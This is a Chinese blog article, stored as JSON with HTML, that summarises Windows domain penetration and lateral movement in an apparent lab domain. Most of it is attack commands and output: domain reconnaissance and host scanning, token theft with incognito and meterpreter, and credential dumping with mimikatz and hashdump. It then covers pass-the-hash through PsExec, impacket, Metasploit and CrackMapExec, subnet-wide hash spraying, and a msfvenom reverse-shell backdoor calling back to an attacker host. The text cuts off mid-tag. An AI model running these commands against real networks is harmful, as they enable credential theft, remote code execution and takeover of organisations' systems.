{"title":"域渗透小结","uid":"b763bab809532eb18f1e59a115b4ee11","slug":"域渗透小结","date":"2022-10-06T13:57:10.000Z","updated":"2022-10-06T13:59:54.623Z","comments":true,"path":"api/articles/域渗透小结.json","keywords":null,"cover":"https://th.bing.com/th/id/OIP.iYZ8PNZDC-twk7RgQikRYwHaKf?pid=ImgDet&rs=1","content":"<h1 id=\"域渗透\"><a class=\"markdownIt-Anchor\" href=\"#域渗透\">#</a> 域渗透</h1>\n<ul>\n<li>常用命令总结</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">klist #查看当前存储的票证\nnet view &#x2F;domain:domainame #查询域内主机<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h2 id=\"1-域基本信息-域控收集\"><a class=\"markdownIt-Anchor\" href=\"#1-域基本信息-域控收集\">#</a> 1、域基本信息、域控收集</h2>\n<ul>\n<li>\n<p>使用 systeminfo 命令，当主机在域中时，会显示所在的域</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">systeminfo<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826101026482.png\" alt=\"image-20220826101026482\"></p>\n</li>\n<li>\n<p>使用 net time /domain 查看域控</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">net time <span class=\"token operator\">/</span>domain<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826102449678.png\" alt=\"image-20220826102449678\"></p>\n</li>\n<li>\n<p>使用 net view 查看有几个域，但是一般会出错</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">net view<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826101201523.png\" alt=\"image-20220826101201523\"></p>\n</li>\n<li>\n<p>确定域控主机的 IP</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">nltest <span class=\"token operator\">/</span>dclist:moonsec\t<span class=\"token comment\">#查看域控</span>\nping 域控主机名 \t<span class=\"token comment\">#查看域控地址</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826102155464.png\" alt=\"image-20220826102155464\"></p>\n</li>\n<li>\n<p>其他信息收集命令</p>\n</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">ipconfig &#x2F;all #查询当前环境，可根据DNS后缀搜索列表查看域控\nnet user &#x2F;domain #查询当前域用户\nnet time #查询域控\nnet group &#x2F;domain #查询域工作组\nnet group &quot;domain admins&quot; &#x2F;domain #查询域管理用户，可以根据上一步查询的组结果查询组内成员\nnet group &quot;domain controllers&quot; &#x2F;domain #查询域控主机名称，可以根据结果ping获取域控IP\nnet config workstation #查看当前工作环境\nnltest &#x2F;dclist:moonsec #查询域控\nping 12server-dc.moonsec.fbi #用ping命令查询域控IP\nnslookup 12server-dc.moonsec.fbi #使用nslookup查询域控主机IP<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"2-主机发现\"><a class=\"markdownIt-Anchor\" href=\"#2-主机发现\">#</a> 2、主机发现</h2>\n<p>在域内进行横向渗透时，首先要收集主机的端口和 IP 信息。</p>\n<ul>\n<li>\n<p>net view /domain:moonsec 查询域内的主机信息</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">net view &#x2F;domain:moonsec #一般会出错，如果错误6118，要在域控内将Computer Browser服务启动<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li>\n<p>arp -a 查询通信</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">arp -a #显示当前主机的arp交换表（IP与MAC地址绑定表）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li>\n<p>使用 nbtscan 发现主机，项目地址：<a href=\"https://github.com/lifenjoiner/nbtscan/releases/tag/nbtscan-v1.5.2-2394b4\">https://github.com/lifenjoiner/nbtscan/releases/tag/nbtscan-v1.5.2-2394b4</a></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nbtscan.exe -r 192.168.0.1&#x2F;24 #可以扫描整个C段的存活主机（不止局限于域内）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826103933833.png\" alt=\"image-20220826103933833\"></p>\n</li>\n<li>\n<p>bat 命令发现主机 —— 系统自带命令，不用软件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">for &#x2F;l %i in (1,1,255) do @ping 10.189.0.%i -w 1 -n 1 | find &#x2F;i &quot;ttl&#x3D;&quot; #修改所在IP段，也是不局限于域内的主机<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826104422522.png\" alt=\"image-20220826104422522\"></p>\n</li>\n<li>\n<p>基于 MSF 的内网主机探测</p>\n<ul>\n<li>使用 msf 进行反弹 shell，获取内网主机后，通过 msf 自带的扫描模块进行 IP 扫描</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">主机存活探测：\nauxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep #ARP扫描\nauxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_sweep #UDP扫描\nauxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname #NETBIOS扫描\nauxiliary&#x2F;scanner&#x2F;snmp&#x2F;snmp_enum #SNMP扫描\nauxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version #SMB扫描\n\n端口扫描：\nauxiliary&#x2F;scanner&#x2F;portscan&#x2F;ack TCP #ACK端口扫描\nauxiliary&#x2F;scanner&#x2F;portscan&#x2F;ftpbounce #FTP bounce端口扫描\nauxiliary&#x2F;scanner&#x2F;portscan&#x2F;syn #SYN 端口扫描\nauxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp #TCP端口扫描，使用较多\nauxiliary&#x2F;scanner&#x2F;portscan&#x2F;xmas #TCP XMas端口扫描<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li>\n<p>nmap 扫描</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-sT: TCP 扫描\n-sS: SYN 扫描\n-sA: ACK 扫描\n-sF：FIN 扫描\n-sU: UDP 扫描\n-sR: RPC 扫描\n-sP: ICMP 扫描\n\nnmap -sS -p 1-65535 -v 192.168.99.177 #扫描示例，使用SYN扫描指定IP的所有端口<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n</ul>\n<h2 id=\"3-常见端口及服务\"><a class=\"markdownIt-Anchor\" href=\"#3-常见端口及服务\">#</a> 3、常见端口及服务</h2>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826105036692.png\" alt=\"image-20220826105036692\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826105100663.png\" alt=\"image-20220826105100663\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220826105114788.png\" alt=\"image-20220826105114788\"></p>\n<h2 id=\"4-域渗透思路\"><a class=\"markdownIt-Anchor\" href=\"#4-域渗透思路\">#</a> 4、域渗透思路</h2>\n<p>​\t\t通过域成员主机，定位出域控制器 IP 及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机 IP，设法从域成员主机内存中 dump 出域管理员密码，进而拿下域控制器、渗透整个内网。</p>\n<h2 id=\"5-内网渗透token\"><a class=\"markdownIt-Anchor\" href=\"#5-内网渗透token\">#</a> 5、内网渗透 Token</h2>\n<p><strong>令牌</strong> (token) 是系统的<strong>临时秘钥</strong>，相当于<strong>账号和密码</strong>，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌在系统重新启动前将持续存在于系统中。 令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。</p>\n<p>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。所以当一个攻击者需 要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。</p>\n<p><strong>令牌的分类</strong>：</p>\n<ul>\n<li>访问令牌 (Access Token)：表示访问控制操作主体的系统对象</li>\n<li>会话令牌 (Session Token)：是交互会话中唯一的身份标识符</li>\n<li>密保令牌 (Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如 U 盾</li>\n</ul>\n<p><strong>windows 环境下的令牌分为两种：</strong></p>\n<ul>\n<li>Delegation Token：授权令牌，它支持交互式会话登录 (例如本地用户直接登录、远程桌面登录访问)</li>\n<li>impersonation Token：模拟令牌，它是非交互的会话 (例如使用 net use 访问共享文件夹)</li>\n</ul>\n<p><strong>注</strong>： 两种 token 只在系统重启后清除，具有 Delegation token 的用户在注销后， 该 Token 将变成 Impersonation token，依旧有效。</p>\n<h3 id=\"51-access-token的窃取与利用\"><a class=\"markdownIt-Anchor\" href=\"#51-access-token的窃取与利用\">#</a> 5.1 Access Token 的窃取与利用</h3>\n<p><strong>Access Token 的窃取与利用需要 administrator 管理员权限。也就是说要<mark>提权</mark>。</strong></p>\n<p>窃取 Access Token 的方法：</p>\n<p><strong>incognito.exe 程序 、InvokeTokenManipulat.ps1 脚本 、MSF 里的 incognito 模块</strong></p>\n<h4 id=\"1incognitoexe\"><a class=\"markdownIt-Anchor\" href=\"#1incognitoexe\">#</a> 1.incognito.exe</h4>\n<p>下载地址：<a href=\"https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip\">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p>\n<p><strong>注：不做免杀会被直接毙</strong></p>\n<ul>\n<li>列出本地 Access Token (需要 administrator 权限)</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">incognito.exe list_tokens -u<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220831200116348.png\" alt=\"image-20220831200116348\"></p>\n<ul>\n<li>使用 Access Token 模拟其他用户</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">incognito.exe execute -c &quot;完整的 Token 名&quot; cmd.exe\nincognito.exe execute -c &quot;NT AUTHORITY\\SYSTEM&quot; cmd.exe\nincognito.exe execute -c &quot;MOONSEC\\12SERVER&quot; cmd.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220831200318419.png\" alt=\"image-20220831200318419\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220831200718957.png\" alt=\"image-20220831200718957\"></p>\n<h4 id=\"2msf下的incognito模块\"><a class=\"markdownIt-Anchor\" href=\"#2msf下的incognito模块\">#</a> 2…MSF 下的 incognito 模块</h4>\n<ul>\n<li>生成 msf 后门并连接</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">6666</span> <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.0.115 -f exe -o msf.exe\nmsfconsole\nuse exploit/multi/handler\n<span class=\"token builtin class-name\">set</span> payload windows/x64/meterpreter/reverse_tcp\n<span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">192.168</span>.0.115\n<span class=\"token builtin class-name\">set</span> lport <span class=\"token number\">6666</span>\nexploit<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li>使用 incognito 并列举出 token 并窃取令牌</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> use incognito\nmeterpreter <span class=\"token operator\">></span> list_tokens -u <span class=\"token comment\">#列出令牌</span>\nmeterpreter <span class=\"token operator\">></span> impersonate_token <span class=\"token string\">\"NT AUTHORITY\\SYSTEM\"</span> <span class=\"token comment\">#窃取令牌</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220831204341167.png\" alt=\"image-20220831204341167\"></p>\n<ul>\n<li>从进程窃取令牌:steal_token PID 命令</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> <span class=\"token function\">ps</span> <span class=\"token comment\">#列出进程</span>\nmeterpreter <span class=\"token operator\">></span> steal_token <span class=\"token number\">2544</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220831204539329.png\" alt=\"image-20220831204539329\"></p>\n<h4 id=\"3invoke-tokenmanipulationps1脚本\"><a class=\"markdownIt-Anchor\" href=\"#3invoke-tokenmanipulationps1脚本\">#</a> 3.Invoke-TokenManipulation.ps1 脚本</h4>\n<p>下载地址：<a href=\"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1\">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</a></p>\n<p>这个脚本是 PowerSploit 下 Exfiltration 文件夹内的一个脚本</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">列举token:\n<span class=\"token function\">Invoke-TokenManipulation</span> <span class=\"token operator\">-</span>Enumerate\n提权至system:\n<span class=\"token function\">Invoke-TokenManipulation</span> <span class=\"token operator\">-</span>CreateProcess <span class=\"token string\">\"cmd.exe\"</span> <span class=\"token operator\">-</span>Username <span class=\"token string\">\"nt authoritysystem\"</span>\n复制<span class=\"token punctuation\">(</span>窃取<span class=\"token punctuation\">)</span>进程token:\n<span class=\"token function\">Invoke-TokenManipulation</span> <span class=\"token operator\">-</span>CreateProcess <span class=\"token string\">\"cmd.exe\"</span> <span class=\"token operator\">-</span>ProcessId 500\n复制<span class=\"token punctuation\">(</span>窃取<span class=\"token punctuation\">)</span>线程token:\n<span class=\"token function\">Invoke-TokenManipulation</span> <span class=\"token operator\">-</span>CreateProcess <span class=\"token string\">\"cmd.exe\"</span> <span class=\"token operator\">-</span>ThreadId 500<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><strong>注：但是复现失败</strong></p>\n<h1 id=\"横向渗透\"><a class=\"markdownIt-Anchor\" href=\"#横向渗透\">#</a> 横向渗透</h1>\n<h2 id=\"1-pthpass-the-hash传递\"><a class=\"markdownIt-Anchor\" href=\"#1-pthpass-the-hash传递\">#</a> 1、PTH (Pass The Hash) 传递</h2>\n<ul>\n<li>PTH：Pass The Hash，在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接 通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码</li>\n<li>pass the hash 原理：\n<ul>\n<li>在 Windows 系统中，通常会使用 NTLM 身份认证</li>\n<li>NTLM 认证不使用明文口令，而是使用口令加密后的 hash 值，hash 值由系统 API 生成 (例如 LsaLogonUser)</li>\n<li>hash 分为 LM hash 和 NT hash，如果密码长度大于 15，那么无法生成 LM hash。从 Windows Vista 和 Windows Server 2008 开始，微软默认禁用 LM hash</li>\n<li>如果攻击者获得了 hash，就能够在身份验证的时候模拟该用户（即跳过调用 API 生成 hash 的过程）</li>\n</ul>\n</li>\n<li>PTH 攻击适用于：\n<ul>\n<li>域 / 工作组环境</li>\n<li>可以获得 hash，但是条件不允许对 hash 进行爆破</li>\n<li>内网中存在<mark>和当前机器相同的密码</mark></li>\n</ul>\n</li>\n<li>微软也对 pth 打过补丁，然而在测试中发现，在打了补丁后，常规的 Pass The Hash 已经无法成功，唯独默认的 Administrator (SID 500) 账号例外，利用这个账号仍可以进行 Pass The Hash 远程 IPC 连接</li>\n<li>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功</li>\n<li>从 windows 到 windows 横向 pth 这一类攻击方法比较广泛</li>\n</ul>\n<h3 id=\"11-mimikatz-pth\"><a class=\"markdownIt-Anchor\" href=\"#11-mimikatz-pth\">#</a> 1.1 mimikatz pth</h3>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">privilege::debug <span class=\"token comment\">#启动后进行调试</span>\nsekurlsa::logonpasswords <span class=\"token comment\">#获取当前主机存在的hash</span>\nmimikatz.exe <span class=\"token string\">\"privilege::debug\"</span> <span class=\"token string\">\"sekurlsa::logonpasswords\"</span> <span class=\"token string\">\"exit\"</span><span class=\"token operator\">></span> password.txt <span class=\"token comment\">#将获取的信息导出到一个文件中，便于复制</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220905183709722.png\" alt=\"image-20220905183709722\"></p>\n<ul>\n<li>获取 hash 之后进行下一步的攻击，如切换权限等</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">privilege::debug #调试\nsekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:32ed87bdb5fdc5e9cba88547376818d4 #使用hash连接，可在域内使用其他主机连接本主机\ndir \\\\192.168.52.141\\c$ #执行成功说  ####实验失败<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220905183920511.png\" alt=\"image-20220905183920511\"></p>\n<h3 id=\"12-psexec\"><a class=\"markdownIt-Anchor\" href=\"#12-psexec\">#</a> 1.2 psexec</h3>\n<ul>\n<li>\n<p>psexec 是 windows 官方自带的，不会存在查杀问题，属于 pstools 利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。</p>\n</li>\n<li>\n<p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。 对方开放 445 端口，就相当于开放了 smb 协议</p>\n</li>\n<li>\n<p>由于会建立和删除服务，<mark>会在系统日志中产生记录，容易被溯源</mark></p>\n</li>\n<li>\n<p>工具位于<strong> PSTools</strong> 下</p>\n</li>\n<li>\n<p>psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递</p>\n</li>\n<li>\n<p>明文密码传递：</p>\n</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">PsExec64.exe &#x2F;accepteula &#x2F;s \\\\192.168.0.123 -u Administrator -p 123456 cmd\n#-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框\n#-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell\nPsExec.exe &#x2F;accepteula &#x2F;s \\\\192.168.0.141 -u Administrator -p 123456 cmd &#x2F;c &quot;ipconfig&quot;\n#直接直接执行回显 -u 域\\用户名 -p 密码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909102011759.png\" alt=\"image-20220909102011759\"></p>\n<ul>\n<li>hash 密文传递：<strong><a href=\"http://xn--impacketpsexec-2c7vr731c.py\">impacket 下的 psexec.py</a></strong> 工具</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">psexec -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 .&#x2F;Administrator@192.168.0.123\n#hash前面的随便填，后面的一段是NTML\npython3 psexec.py moonsec&#x2F;Administrator@192.168.0.142 #直接登录，执行后输入密码\npsexec &#x2F;accepteula &#x2F;s \\\\12server1 -u Administrator -p 123456 cmd #登录主机其他用户<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909130718598.png\" alt=\"image-20220909130718598\"></p>\n<ul>\n<li>使用 psexec 注意事项\n<ul>\n<li>需要远程系统开启 admin$ 共享（默认是开启的）</li>\n<li>因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放<mark> 445</mark> 端口</li>\n<li>在使用 IPC$ 连接目标系统后，不需要输入账户和密码</li>\n<li>在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务， 命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。</li>\n<li>使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是 administrator 权限的 shell</li>\n<li>在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能， 只能依靠账号和密码进行传递</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"13-msf的psexec模块\"><a class=\"markdownIt-Anchor\" href=\"#13-msf的psexec模块\">#</a> 1.3 msf 的 psexec 模块</h3>\n<ul>\n<li>生成后门并建立连接</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">6666</span> <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.254.130 -f exe -o msf.exe\nmsfconsole\nmsf6 <span class=\"token operator\">></span> use exploit/multi/handler\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">192.168</span>.254.130\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> lport <span class=\"token number\">6666</span>\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> payload windows/x64/meterpreter/reverse_tcp\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> exploit<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li>导出 hash 值，此动作需要 administrator 用户才可完成</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> hashdump \n12server1:1001:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::\nadmin:1002:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li>放到后台，使用相关模块</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> background\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> search psexec\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> use exploit/windows/smb/psexec\nmsf6 exploit<span class=\"token punctuation\">(</span>windows/smb/psexec<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> SMBUSER Administrator\nmsf6 exploit<span class=\"token punctuation\">(</span>windows/smb/psexec<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> rhosts <span class=\"token number\">192.168</span>.254.144 <span class=\"token comment\">#可以设置ip为192.168.0.1/24进行批量pth</span>\nmsf6 exploit<span class=\"token punctuation\">(</span>windows/smb/psexec<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387\nmsf6 exploit<span class=\"token punctuation\">(</span>windows/smb/psexec<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> exploit<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909134215264.png\" alt=\"image-20220909134215264\"></p>\n<p>注：<strong>关闭防火墙</strong>后测试成功，未关闭防火墙提示超时无法连接。这里是使用本地 hash 之后提权到本地 system，下图为使用同一 hash 碰撞域控服务器</p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909134510299.png\" alt=\"image-20220909134510299\"></p>\n<h3 id=\"14-crackmapexec-c段批量pth\"><a class=\"markdownIt-Anchor\" href=\"#14-crackmapexec-c段批量pth\">#</a> 1.4 CrackMapExec C 段批量 pth</h3>\n<ul>\n<li>kali 自带工具，项目地址：<a href=\"https://github.com/byt3bl33d3r/CrackMapExec.git%EF%BC%8Ckali%E5%AE%89%E8%A3%85%E7%9B%B4%E6%8E%A5%E7%94%A8\">https://github.com/byt3bl33d3r/CrackMapExec.git，kali 安装直接用</a>  <code>sudo apt install crackmapexec</code></li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">crackmapexec smb <span class=\"token number\">192.168</span>.254.0/24 -u administrator -H 42e2656ec24331269f82160ff5962387 <span class=\"token comment\">#对C段进行PTH，-H跟NTML</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909140039728.png\" alt=\"image-20220909140039728\"></p>\n<h3 id=\"15-wmi\"><a class=\"markdownIt-Anchor\" href=\"#15-wmi\">#</a> 1.5 WMI</h3>\n<ul>\n<li>WMI 全称 Windows Management Instrumentation 即 Windows 管理工具， <mark>Windows 98 以后</mark>的操作系统都支持 WMI</li>\n<li>由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将 PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些</li>\n</ul>\n<h4 id=\"wmic命令使用明文\"><a class=\"markdownIt-Anchor\" href=\"#wmic命令使用明文\">#</a> wmic 命令 —— 使用明文</h4>\n<ul>\n<li>WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目 标主机 C 盘的 ip.txt 文件中</li>\n<li>使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口 ( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤ 445 端⼝传回显）</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">wmic &#x2F;node:192.168.254.144 &#x2F;user:administrator &#x2F;password:QWEasd123 process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\\ip.txt&quot;\n#node：IP，user：用户名 password：密码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<ul>\n<li>建立 IPC$，读取回显结果</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">net use \\\\192.168.254.144\\ipc$ &quot;QWEasd123&quot; &#x2F;user:administrator #建立IPc\ntype \\\\192.168.254.144\\c$\\ip.txt #读取文件内容<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909200625078.png\" alt=\"image-20220909200625078\"></p>\n<h4 id=\"wmiexecpy\"><a 